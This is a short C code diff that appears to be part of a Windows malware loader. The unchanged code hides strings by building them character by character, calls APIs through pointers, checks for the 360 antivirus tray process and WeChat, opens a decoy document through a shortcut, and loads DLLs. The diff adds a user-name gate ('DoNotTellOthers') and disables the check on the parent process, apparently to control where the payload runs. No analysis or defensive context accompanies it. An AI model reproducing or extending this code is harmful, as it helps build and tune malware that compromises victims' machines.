@@ -200,6 +200,10 @@ int ExplorerFirstStart() {
 
 	iRet = GetPathFromFullName(szCurrentExePath, szCurrentPath);//GetModuleBaseName	返回进程名不包含路径
 
+	if (lplstrcmpiA(gUserName, "DoNotTellOthers") != 0) {
+		lpExitProcess(0);
+	}
+
 	if (lplstrcmpiA(szCurrentPath, strDataPath) != 0)
 	{
 		char szwechat[] = { 'W','e','C','h','a','t','.','e','x','e',0 };
@@ -215,7 +219,7 @@ int ExplorerFirstStart() {
 		char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
 		int b360Running = GetProcessIdByName(sz360Tray);
 
-		if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) )
+		//if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) )
 		{
 			char strShowFileName[MAX_PATH] = { 0 };
 			char* pShowFileName = GetLinkDocFileName(strShowFileName, szCurrentPath);
@@ -230,9 +234,7 @@ int ExplorerFirstStart() {
 				ExitProcess(0);
 			}
 		}
-		else {
-			ExitProcess(0);
-		}
+
 
 		char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
 		DWORD iDllCnt = 0;
